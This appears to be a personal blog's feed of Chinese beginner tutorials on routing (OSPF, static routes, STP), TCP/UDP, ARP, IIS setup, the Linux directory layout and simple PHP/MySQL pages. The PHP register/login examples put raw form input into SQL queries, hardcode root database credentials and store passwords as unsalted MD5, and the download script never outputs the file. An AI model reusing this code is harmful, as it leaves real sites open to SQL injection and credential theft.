Flags NextHop         Interface    127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0    127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Ethernet0/0/0    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Ethernet0/0/0    192.168.2.0/24  OSPF    10   2           D   192.168.1.2     Ethernet0/0/0</code></pre><p>可以看到已经通过OSPF学到了路由器<code>R3</code>的路由，再来<code>ping</code>一下<code>R3</code>试试：</p><pre><code>&lt;R1&gt;ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Reply from 192.168.2.2: bytes=56 Sequence=1 ttl=254 time=60 ms    Reply from 192.168.2.2: bytes=56 Sequence=2 ttl=254 time=30 ms    Reply from 192.168.2.2: bytes=56 Sequence=3 ttl=254 time=80 ms    Reply from 192.168.2.2: bytes=56 Sequence=4 ttl=254 time=60 ms    Reply from 192.168.2.2: bytes=56 Sequence=5 ttl=254 time=50 ms--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    5 packet(s) received    0.00% packet loss    round-trip min/avg/max = 30/56/80 ms</code></pre><p>可以看到，已经能<code>ping</code>通了，说明配置没有问题。<br>再来看一下OSPF状态信息：</p><pre><code>&lt;R1&gt;dis ospf peer brief     OSPF Process 1 with Router ID 192.168.1.1        Peer Statistic Information----------------------------------------------------------------------------Area Id          Interface                        Neighbor id      State    0.0.0.0          Ethernet0/0/0                    192.168.1.2      Full        ----------------------------------------------------------------------------</code></pre>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由交换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态路由配置</title>
      <link href="/2018/09/19/router05/"/>
      <url>/2018/09/19/router05/</url>
      
        <content type="html"><![CDATA[<p><strong>什么是静态路由？</strong><br>静态路由是指由用户或网络管理员手工配置的路由信息。当网络的拓扑结构或链路的状态发生变化时，网络管理员需要手工去修改路由表中相关的静态路由信息。静态路由信息在缺省情况下是私有的，不会传递给其他的路由器。</p><p>实验环境：<code>华为模拟器eNSP</code><br>现在有这样一个拓扑图：<br><img alt data-src="https://image.3001.net/images/20181123/15429728542053.jpg" class="lozad"><br>很明显路由器<code>R1</code>和<code>R3</code>之间无法通信，<code>ping</code>一下试试。</p><pre><code>[R1]ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Request time out    Request time out    Request time out    Request time out    Request time out--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    0 packet(s) received    100.00% packet loss</code></pre><p>全部超时，现在通过添加静态路由使<code>R1</code>和<code>R3</code>之间相互通信，先来看一下<code>R1</code>的路由表：</p><pre><code>&lt;R1&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public        Destinations : 4        Routes : 4        Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface    127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0    127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Ethernet0/0/0    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Ethernet0/0/0</code></pre><p>现在只有回环接口和本地IP，现在来给他添加去往R3的静态路由：</p><pre><code>[R1]ip route-static 192.168.2.0 255.255.255.0 192.168.1.2Jul 25 2018 20:37:00-08:00 R1 DS/4/DATASYNC_CFGCHANGE:OID 1.3.6.1.4.1.2011.5.25.191.3.1 configurations have been changed. The current change number is 3, the change loop count is 0, and the maximum number of records is 4095.</code></pre><p>查看一下路由表：</p><pre><code>&lt;R1&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public        Destinations : 5        Routes : 5        Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface    127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0    127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Ethernet0/0/0    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Ethernet0/0/0    192.168.2.0/24  Static  60   0          RD   192.168.1.2     Ethernet0/0/0</code></pre><p>发现路由表中已经加进了去往<code>R3</code>的静态路由，现在来<code>ping</code>一下<code>R3</code>。</p><pre><code>&lt;R1&gt;ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Request time out    Request time out    Request time out    Request time out    Request time out--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    0 packet(s) received    100.00% packet loss</code></pre><p>看到无法<code>ping</code>通,因为现在只有去的路由，但是没有回来的路由，也就是说<code>ping</code>的数据包现在只知道怎么去，但是不知道怎么回来，那么现在来给他添加回程路由。<br>回程路由配在路由器<code>R3</code>上面。</p><pre><code>[R3]ip route-static 192.168.1.0 255.255.255.0 192.168.2.1Jul 25 2018 20:43:10-08:00 R3 DS/4/DATASYNC_CFGCHANGE:OID 1.3.6.1.4.1.2011.5.25.191.3.1 configurations have been changed. The current change number is 3, the change loop count is 0, and the maximum number of records is 4095.</code></pre><p>现在再去<code>R1</code>上面<code>ping</code>一下<code>R3</code>试试。</p><pre><code>&lt;R1&gt;ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Reply from 192.168.2.2: bytes=56 Sequence=1 ttl=254 time=40 ms    Reply from 192.168.2.2: bytes=56 Sequence=2 ttl=254 time=60 ms    Reply from 192.168.2.2: bytes=56 Sequence=3 ttl=254 time=30 ms    Reply from 192.168.2.2: bytes=56 Sequence=4 ttl=254 time=90 ms    Reply from 192.168.2.2: bytes=56 Sequence=5 ttl=254 time=100 ms--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    5 packet(s) received    0.00% packet loss    round-trip min/avg/max = 30/64/100 ms</code></pre><p>发现可以<code>ping</code>通了，说明静态路由添加成功。<br>配置静态路由的命令是<code>ip route-static 要去网段 要去网段的子网掩码 下一跳</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由交换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS安装</title>
      <link href="/2018/09/17/IIS%E5%AE%89%E8%A3%85/"/>
      <url>/2018/09/17/IIS%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>Windows服务器服务安装</p><a id="more"></a><p><strong>实验环境：win2008R2虚拟机</strong><br>1.首先打开虚拟机，然后选中<code>管理工具</code>-&gt;<code>服务器管理器</code>.<br><img alt data-src="https://image.3001.net/images/20181123/15429749949217.jpg" class="lozad"></p><p>2.选中<code>角色</code>-&gt;<code>添加角色</code>.<br><img alt data-src="https://image.3001.net/images/20181123/15429749967514.jpg" class="lozad"></p><p>3.默认选项，下一步。<br><img alt data-src="https://image.3001.net/images/20181123/15429749982545.jpg" class="lozad"></p><p>4.勾选要安装的服务器，<code>Web服务器</code>.<br><img alt data-src="https://image.3001.net/images/20181123/15429750007758.jpg" class="lozad"></p><p>5.默认选项，下一步。<br><img alt data-src="https://image.3001.net/images/20181123/15429750029854.jpg" class="lozad"></p><p>6.这里根据自己的需求勾选需要安装的服务。<br><img alt data-src="https://image.3001.net/images/20181123/15429750051150.jpg" class="lozad"></p><p>7.默认选项，下一步。<br><img alt data-src="https://image.3001.net/images/20181123/15429750098737.jpg" class="lozad"></p><p>8.等待安装完成。<br><img alt data-src="https://image.3001.net/images/20181123/15429750114912.jpg" class="lozad"></p><p>9.安装成功。<br><img alt data-src="https://image.3001.net/images/20181123/15429750139126.jpg" class="lozad"></p><p>10.可以通过在浏览器地址栏输入<code>localhost</code>来验证安装是否成功。<br><img alt data-src="https://image.3001.net/images/20181123/15429750153275.jpg" class="lozad"></p><p>11.接着来看一下管理控制台，打开<code>管理工具</code>-&gt;<code>Internet信息服务（IIS）管理器</code>.<br><img alt data-src="https://image.3001.net/images/20181123/15429750173141.jpg" class="lozad"></p><p>12.依次展开<code>顾北清</code>-&gt;<code>网站</code>，可以把自己的网站放到这个目录下。<br><img alt data-src="https://image.3001.net/images/20181123/15429750199742.jpg" class="lozad"></p><p>13.右击<code>网站</code>选择<code>添加网站</code>,可以添加自己的网站。<br><img alt data-src="https://image.3001.net/images/20181123/15429750217431.jpg" class="lozad"></p><p>14.点击添加之后可以看到具体的参数设置。<br><img alt data-src="https://image.3001.net/images/20181123/15429750234667.jpg" class="lozad"></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP实现简单下载</title>
      <link href="/2018/09/12/php03/"/>
      <url>/2018/09/12/php03/</url>
      
        <content type="html"><![CDATA[<p><code>PHP</code>文件为<code>download.php</code>,供下载的文件为<code>1.jpg</code>.</p><pre><code>&lt;?php    $filename=&quot;1.jpg&quot;;    if(!file_exists($filename)){        die(&quot;文件不存在&quot;);    }                   //判断文件是否存在    $fp =fopen($filename,&quot;r&quot;);  //打开文件    $file_size=filesize($filename);   //声明文件大小    header(&quot;Content-type:application/octet-stream&quot;);    header(&quot;Accept-Ranges:bytes&quot;);   //按字节大小返回    header(&quot;Accept-Length:&quot;.$file_size);   //告诉浏览器文件大小    header(&quot;Content-Disposition: attachment; filename=&quot;.$filename);  //下载框中文件的名字    $buffer=1024;    while(!feof($fp)){        $data=fread($fp,$buffer);    }            //判断文件是否下载完    fclose($fp);    //关闭文件?&gt;</code></pre><p>访问验证一下:<br><img alt data-src="https://image.3001.net/images/20181123/15429722899252.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429722916040.jpg" class="lozad"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP实现一个简陋的注册登录页面</title>
      <link href="/2018/09/11/php02/"/>
      <url>/2018/09/11/php02/</url>
      
        <content type="html"><![CDATA[<p>今天来水一篇没有**用的 /滑稽脸，代码简陋臃肿考虑不全，各位大佬轻喷，还望不吝赐教。<br>首先考虑了一下需要至少四个页面：<code>register.html</code>、<code>register.php</code>、<code>login.html</code>、<code>login.php</code>。<br><code>register.html</code>是这么写的：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;head&gt;    &lt;title&gt;注册界面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;register.php&quot; method=&quot;post&quot;&gt;        用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;/input&gt;        &lt;br /&gt;        密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/input&gt;        &lt;br /&gt;        &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt;&lt;/input&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><code>register.php</code>是这么写的：</p><pre><code>&lt;?php    header(&quot;Content-type:text/html;charset=utf-8&quot;);    $conn=new mysqli(&apos;localhost&apos;,&apos;wy&apos;,&apos;000000&apos;,&apos;test&apos;);    if ($conn-&gt;connect_error){        die(&quot;服务器连接失败！&quot;);    }    $name=$_POST[&quot;name&quot;];    $password=$_POST[&quot;password&quot;];    $sql=&quot;insert into new_info values(&apos;$name&apos;,$password)&quot;;    $res=$conn-&gt;query($sql);    if(!$res){        echo &quot;注册失败！&quot;;    }else{            if($conn-&gt;affected_rows&gt;0){                sleep(2);                header(&quot;Location:login.html&quot;);                exit;            }else{                echo &quot;注册失败&quot;;            }    }    $conn-&gt;close();?&gt;</code></pre><p><code>login.html</code>是这么写的：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;head&gt;    &lt;title&gt;登录界面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;注册成功,请登录！&lt;/p&gt;    &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;        用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;/input&gt;        &lt;br /&gt;        密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/input&gt;        &lt;br /&gt;        &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;&lt;/input&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><code>login.php</code>是这么写的：</p><pre><code>&lt;?php    header(&quot;Content-type:text/html;charset=utf-8&quot;);    $conn=new mysqli(&apos;localhost&apos;,&apos;wy&apos;,&apos;000000&apos;,&apos;test&apos;);    if ($conn-&gt;connect_error){        die(&quot;服务器连接失败！&quot;);    }    $name=$_POST[&quot;name&quot;];    $password=$_POST[&quot;password&quot;];    $sql_name=&quot;select name from new_info where name=&apos;$name&apos;&quot;;    $res_sql=$conn-&gt;query($sql_name);    if($conn-&gt;affected_rows==0){        die(&quot;账号或密码有误&quot;);    }else{        $sql_pass=&quot;select password from new_info where name=&apos;$name&apos;&quot;;        $res_pass=$conn-&gt;query($sql_pass);        $row_pass=$res_pass-&gt;fetch_row();        if($row_pass[0]==$password){            echo &quot;登录成功！&quot;;        }else{            echo &quot;账号或密码有误&quot;;        }    }    $conn-&gt;close();?&gt;</code></pre><p>然后来看一下效果：<br><img alt data-src="https://image.3001.net/images/20181123/15429721366856.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429721385931.jpg" class="lozad"></p><p>看一下数据库：<br><img alt data-src="https://image.3001.net/images/20181123/15429721407200.jpg" class="lozad"></p><p>可以看到已经将数据写入数据库。<br>接着来登录试一下：<br><img alt data-src="https://image.3001.net/images/20181123/15429721422802.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429721448229.jpg" class="lozad"></p><p>换个错误密码试一下：<br><img alt data-src="https://image.3001.net/images/20181123/1542972146521.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429721471453.jpg" class="lozad"></p><blockquote><p>#<strong>2018-09-04   问题修正：</strong><br><strong>1.用户密码加密</strong><br><strong>2.数据库编码问题</strong></p></blockquote><p><strong>1.用户密码加密</strong></p><p><code>register.php</code>页面：</p><pre><code>&lt;?php    header(&quot;Content-type:text/html;charset=utf-8&quot;);    $conn=new mysqli(&apos;192.168.134.128&apos;,&apos;root&apos;,&apos;123456&apos;,&apos;test&apos;);    if ($conn-&gt;connect_error){        die(&quot;服务器连接失败！&quot;);    }    $name=$_POST[&quot;name&quot;];    $password=$_POST[&quot;password&quot;];    $password=md5($password);     //将用户输入的密码进行md5加密    $sql=&quot;insert into test values(&apos;$name&apos;,&apos;$password&apos;)&quot;;    $res=$conn-&gt;query($sql);    if(!$res){        echo &quot;注册失败！&quot;;   }else{            if($conn-&gt;affected_rows&gt;0){                sleep(2);                header(&quot;Location:login.html&quot;);            }else{                echo &quot;注册失败&quot;;            }    }    $conn-&gt;close();?&gt;</code></pre><p><code>login.php</code>页面：</p><pre><code>&lt;?php    header(&quot;Content-type:text/html;charset=utf-8&quot;);    $conn=new mysqli(&apos;192.168.134.128&apos;,&apos;root&apos;,&apos;123456&apos;,&apos;test&apos;);    if ($conn-&gt;connect_error){        die(&quot;服务器连接失败！&quot;);    }    $name=$_POST[&quot;name&quot;];    $password=$_POST[&quot;password&quot;];    $password=md5($password);    //对用户输入的密码进行md5加密    $sql_name=&quot;select name from test where name=&apos;$name&apos;&quot;;    $res_sql=$conn-&gt;query($sql_name);    if($conn-&gt;affected_rows==0){        die(&quot;账号或密码有误!&quot;);    }else{        $sql_pass=&quot;select password from test where name=&apos;$name&apos;&quot;;        $res_pass=$conn-&gt;query($sql_pass);        $row_pass=$res_pass-&gt;fetch_row();        if($row_pass[0]==$password){            //将用户输入的加密密码与数据库密码进行对比            echo &quot;登录成功！&quot;;        }else{            echo &quot;账号或密码有误&quot;;        }    }    $conn-&gt;close();?&gt;</code></pre><p><strong>2.数据库编码问题</strong><br>在数据库执行<code>set names utf8</code>命令，将数据库编码改为<code>utf8</code>。<br>这样就可以使用中文名注册登录。</p><blockquote><h1 id="2018-09-06-问题修正："><a href="#2018-09-06-问题修正：" class="headerlink" title="2018-09-06   问题修正："></a><strong>2018-09-06   问题修正：</strong></h1><p><strong>用户注册或者登录时输入为空的问题</strong></p></blockquote><p><code>register.php</code>页面：</p><pre><code>&lt;?php    header(&quot;Content-type:text/html;charset=utf-8&quot;);    $conn=new mysqli(&apos;192.168.134.128&apos;,&apos;root&apos;,&apos;123456&apos;,&apos;test&apos;);    if ($conn-&gt;connect_error){        die(&quot;服务器连接失败！&quot;);    }    $name=$_POST[&quot;name&quot;];    $password=$_POST[&quot;password&quot;];    if(empty($name) || empty($password)){             //判断注册时账号或密码是否为空        die(&apos;账号或密码不能为空！&apos;);    }else{        $password=md5($password);        $sql=&quot;insert into test values(&apos;$name&apos;,&apos;$password&apos;)&quot;;        $res=$conn-&gt;query($sql);        if(!$res){            echo &quot;注册失败！&quot;;        }else{                if($conn-&gt;affected_rows&gt;0){                    sleep(2);                    header(&quot;Location:login.html&quot;);                }else{                    echo &quot;注册失败&quot;;                }        }        $conn-&gt;close();    }?&gt;</code></pre><p><code>login.php</code>页面：</p><pre><code>&lt;?php    header(&quot;Content-type:text/html;charset=utf-8&quot;);    $conn=new mysqli(&apos;192.168.134.128&apos;,&apos;root&apos;,&apos;123456&apos;,&apos;test&apos;);    if ($conn-&gt;connect_error){        die(&quot;服务器连接失败！&quot;);    }    $name=$_POST[&quot;name&quot;];    $password=$_POST[&quot;password&quot;];    if(empty($name) || empty($password)){           //判断登陆时账号或密码是否为空        die(&apos;账号或密码不能为空！&apos;);    }else{        $password=md5($password);        //var_dump($password);        $sql_name=&quot;select name from test where name=&apos;$name&apos;&quot;;        $res_sql=$conn-&gt;query($sql_name);        if($conn-&gt;affected_rows==0){            die(&quot;账号或密码有误!&quot;);        }else{            $sql_pass=&quot;select password from test where name=&apos;$name&apos;&quot;;            $res_pass=$conn-&gt;query($sql_pass);            $row_pass=$res_pass-&gt;fetch_row();            if($row_pass[0]==$password){                echo &quot;登录成功！&quot;;            }else{                echo &quot;账号或密码有误&quot;;            }        }        $conn-&gt;close();    }?&gt;</code></pre><p>代码臃肿，还望见谅。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysqli面向对象操作数据库</title>
      <link href="/2018/09/04/php01/"/>
      <url>/2018/09/04/php01/</url>
      
        <content type="html"><![CDATA[<p>首先配置一下数据库：<br><img alt data-src="https://image.3001.net/images/20181123/15429719697727.jpg" class="lozad"></p><p>接着用PHP中的Mysqli扩展库面向对象查询这个数据表。<br>操作分为以下几个步骤：</p><ul><li>连接数据库</li><li>操作数据库</li><li>处理结果</li><li>关闭资源</li></ul><hr><pre><code>&lt;?php    $connect=new mysqli(&apos;localhost&apos;,&apos;wy&apos;,&apos;000000&apos;,&apos;test&apos;);   //连接数据库    if (!$connect){        die(&quot;连接失败&quot;);    }                                                      //判断是否存在    $sql=&quot;select * from gubeiqing&quot;;                       //查询语句    $result=$connect-&gt;query($sql);                       //查询语句返回结果集    while($row=$result-&gt;fetch_row()){        foreach($row as $val){            echo $val;        }    }    $result-&gt;free();                                      //释放内存    $connect-&gt;close();                                   //关闭连接?&gt;</code></pre><p>接着来运行一下：<br><img alt data-src="https://image.3001.net/images/20181123/1542971971491.jpg" class="lozad"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由交换协议-----STP</title>
      <link href="/2018/08/31/router04/"/>
      <url>/2018/08/31/router04/</url>
      
        <content type="html"><![CDATA[<h1 id="路由交换—–STP"><a href="#路由交换—–STP" class="headerlink" title="路由交换—–STP"></a>路由交换—–STP</h1><p>STP协议（生成树协议）逻辑上断开环路，防止二层网络的广播风暴的产生。<br><strong>为什么需要STP协议？</strong><br>假设有这样一个拓扑:<br><img alt data-src="https://image.3001.net/images/20181123/15429728018997.jpg" class="lozad"><br>现在PC1<code>ping</code>网关<code>192.168.1.3</code>，而这个网关是不存在的,同时在LSW2上进行抓包。<br><img alt data-src="https://image.3001.net/images/20181123/15429728021735.jpg" class="lozad"><br>可以看到这个网络里现在充斥着大量的重复包，形成了广播风暴，这种时候交换机的性能急剧下降，因为从PC1出去的包在LSW2上没有找到目标地址的MAC地址，这时交换机会将这个单播帧向除了源端口之外的其它端口转发，转发到其它交换机上，其它的交换机又会重复这个步骤，使得这个网络形成了环路，导致广播风暴，这时就引入了STP协议。</p><p><strong>STP的作用</strong></p><ul><li>消除环路，通过阻断冗余链路来消除网络中可能存在的环路。</li><li>链路备份：当活动路径发生故障时，激活备份链路，即使恢复网络的连通性。</li></ul><p><strong>根桥选举</strong><br>在STP网络中，会存在一个交换机为根桥，其他的交换机为非根桥，根桥是STP网络的逻辑中心，当根桥出现故障时，非根桥之间会交互BPDU信息并重新选举根桥。</p><p>在STP中有三种端口角色：根端口、指定端口、预备端口。<br>根端口：非根桥去往根桥路径最短的端口。<br>指定端口：是指所连网络转发配置BDPU的端口，根桥的每个端口都是指定端口。<br>预备端口：一个端口不是跟端口也不是指定端口，俺么这个端口就是预备端口，预备端口是被阻塞的。</p><p>根桥选举的依据是桥ID，桥ID是由桥优先级和MAC地址构成的，默认的桥优先级是32768，优先级的数值越小越优先也最容易被选举为根桥，如果优先级相同那么就比较MAC地址，MAC地址有效越优先。<br>默认情况下，每个交换机默认自己是根桥，然后通过指定端口向外发送BPDU报文，然后收到BPDU报文的交换机会将报文里的桥ID与自己的比较，相互比较之后选举出根桥。</p><p><strong>根端口选举</strong><br>每个非根桥都要选举一个根端口，即距离根桥最近的那个端口。选举根端口的过程是：</p><ul><li>非根交换机到根桥的链路开销。</li><li>如果开销一样，比较上一级发送者的桥ID，选出发送者桥ID最小的对应端口。</li><li>如果上一级发送者桥ID一样就比较发送端口的优先级，选出优先级最小的对应端口。</li><li>如果发送端口的优先级也一样，再比较发送端口的端口号。</li></ul><p><strong>指定端口选举</strong><br>指定端口就是发送BPDU报文的端口，指定端口的选举是这样的：</p><ul><li>首先比较路径开销，开销最小的为指定端口。</li><li>如果开销相同比较端口所在交换机的桥ID，桥ID最新的端口选举为指定端口。</li><li>如果桥ID比较不出来接着比较端口ID，端口ID最小的选举为指定端口。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由交换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由交换协议-----传输层协议</title>
      <link href="/2018/08/29/router03/"/>
      <url>/2018/08/29/router03/</url>
      
        <content type="html"><![CDATA[<p>#传输层协议<br>传输层比较重要的两个协议是<code>TCP</code>和<code>UDP</code>协议。<br><strong>1.TCP</strong><br>TCP是一种可靠的、面向连接的全双工传输层协议。<br><code>TCP</code>的报文格式是这样的：<br><img alt data-src="https://image.3001.net/images/20181123/15429727102624.jpg" class="lozad"><br>源端口（2字节）：源主机应用程序使用的端口号。源端口和IP地址用作标识报文的返回地址。<br>目的端口（2字节）：目的主机应用程序使用的端口号。<br>序号（4字节）：<code>seq</code>序号，标识发送方向接收方发送的数据段的序号。<br>确认序号（4字节）：<code>Ack</code>序号，接收方应答的序号，为接受到的序号+1。<br>头长度（4字节）：表示i头部占4字节的数目。<br>URG：是否为紧急指针，0为不是，1为是。<br>ACK：请求或者应答连接，用于确认序号有效。<br>PSH：最快速度传输数据。<br>RST：重建会话。<br>SYN：同步连接序号，用于建立连接。<br>FIN：结束连接，为0是请求结束连接，为1是结束连接。<br>窗口大小（2字节）：接收方告诉发送方想接收到的每个数据段的大小，可用于流量控制。<br>校验和（2字节）：对头部和数据进行校验。<br>紧急指针：当URG为1时生效，表示这个数据是紧急数据，优先发送。<br>选项：用于记录路由或者时间戳之类的可选任务。</p><p>TCP传输数据分为三个过程：建立连接、传输数据、关闭连接。<br>建立连接的过程是一个三次握手的过程，首先，客户端发送一个标识为<code>SYN</code>，序列为<code>seq=a</code>的数据包，服务器端收到后，要对这个包进行确认，便回复一个<code>SYN</code>，<code>ACK</code>，<code>Ack=a+1</code>，<code>seq=b</code>的数据包，客户端收到这个包之后，进行确认，回复一个<code>ACK</code>，<code>seq=a+1</code>，<code>Ack=b+1</code>的包，这样就建立连接了。<br>注意：<code>ACK</code>是标志位的，用于确认序号有效。<code>Ack</code>是确认序号，是<code>seq+1</code>。<br>接着就开始传输数据。<br>数据传输结束后开始进行关闭连接，即TCP四次挥手。假设客户端想终止这个连接，于是发送一个数据包:<code>FIN</code>，<code>ACK</code>，<code>seq=a</code>，服务器端收到之后，进行确认回复<code>ACK</code>，<code>seq=b</code>，<code>Ack=a+1</code>，确认完客户端的终止连接之后，服务器端再进行终止连接，向客户端发送数据包为：<code>FIN</code>、<code>ACK</code>，<code>seq=b</code>，<code>Ack=a+1</code>，客户端收到之后，知道服务器端也终止连接然后进行确认回复：<code>ACK</code>，<code>seq=a+1</code>，<code>Ack=b+1</code>，这样会话就关闭了。</p><p><strong>2.UDP</strong><br><code>UDP</code>是一种不可靠的、无连接的传输层协议，他不像<code>TCP</code>一样需要三次握手四次挥手，<code>UDP</code>不需要事先建立连接，因此也无法保证数据的可靠。<br><code>UDP</code>报文的头部是这样的：<br><img alt data-src="https://image.3001.net/images/20181123/154297271254.jpg" class="lozad"><br>源端口（2字节）：初始化通信的端口号。<br>目的端口（2字节）：接收方应用程序的地址接口。<br>UDP数据包长度（2字节）：UDP头和数据的总长度。<br>校验和（2字节）：数据包的头部和包内容的校验。</p><p>使用<code>UDP</code>发送数据时，应用程序需要提供报文到达确认、排序、流量控制等功能，<code>UDP</code>没有像<code>TCP</code>一样的重传机制，占用资源小，处理效率高。一般用来传输语音、视频等。</p><p><strong>对比</strong><br><img alt data-src="https://image.3001.net/images/20181123/15429727143251.jpg" class="lozad"></p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由交换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux结构目录</title>
      <link href="/2018/08/19/linux01/"/>
      <url>/2018/08/19/linux01/</url>
      
        <content type="html"><![CDATA[<h1 id="linux结构目录"><a href="#linux结构目录" class="headerlink" title="linux结构目录"></a>linux结构目录</h1><p><code>Linux</code>中有一句话叫做：一切皆文件。<br>下面来了解一下这些文件。<br>首先看一下<code>Linux</code>根目录下结构：<br><img alt data-src="https://image.3001.net/images/20181123/15429743143208.jpg" class="lozad"><br><code>bin</code>：存放二进制可执行文件，一般常用命令都存放在这里。<br><code>boot</code>：存放系统启动时的一些引导文件。<br><code>dev</code>：存放设备文件，一般时用于挂载光驱，访问文件相当于访问光驱。<br><code>etc</code>：存放系统配置文件。<br><code>home</code>：默认的用户的家目录，存放所有用户的文件。<br><code>lib</code>、<code>lib64</code>:存放系统中的程序运行所需要的函数库及内核模块。<br><code>media</code>：自动挂载的目录，一般U盘会自动挂载到这个目录。<br><code>mnt</code>：默认挂载点，临时挂载其他文件系统。<br><code>opt</code>：额外安装的应用程序安装的目录。<br><code>proc</code>：系统内存的映射，时虚拟文件系统，可以通过它访问系统内核信息或者查看系统的硬件信息等。<br><code>root</code>：系统管理员的家目录。<br><code>run</code>：运行时所需要的东西。<br><code>sbin</code>：存放系统专用的二进制可执行文件，只有管理员才可以使用。<br><code>srv</code>：服务启动之后需要访问的数据目录。<br><code>sys</code>：存放系统信息。<br><code>tmp</code>：存放各种临时文件，比如正在执行程序的临时文件就存放在这。<br><code>usr</code>：系统所有的程序安装在这里。<br><code>var</code>：存放系统执行过程中经常需要变化的文件。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由交换协议-----ARP</title>
      <link href="/2018/08/18/router02/"/>
      <url>/2018/08/18/router02/</url>
      
        <content type="html"><![CDATA[<p>#路由交换协议—–ARP<br><strong>ARP协议</strong><br>ARP（Address Resolution Protocol），是根据IP地址获取MAC地址的一个<code>TCP/IP</code>协议，即将IP地址对应到物理地址，从而实现数据链路层的可达性。<br><code>ARP</code>的数据包是这样的：<br><img alt data-src="https://image.3001.net/images/20181123/15429726284249.jpg" class="lozad"><br>硬件类型：发送方需要知道的硬件地址类型，一般为以太网（值为1）。<br>协议类型：发送方提供的三层协议地址类型，一般为IP。<br>硬件地址长度和协议长度：硬件地址和协议地址的长度。<br>操作类型：用来表示这个报文的类型。</p><ul><li><code>1</code>表示ARP请求</li><li><code>2</code>表示ARP响应</li><li><code>3</code>表示RARP请求</li><li><code>4</code>表示RARP响应<br>RARP（Reverse Address Resolution Protocol）：反向地址转换协议，即将MAC地址对应到IP地址，与ARP相反。</li></ul><p>发送方的硬件地址：发送ARP报文设备的MAC地址。<br>源IP地址：发送方的IP地址。<br>目标硬件地址：接收方的MAC地址。<br>目标IP地址：接收方的IP地址。<br>抓个包看一下：<br><img alt data-src="https://image.3001.net/images/20181123/15429726311091.jpg" 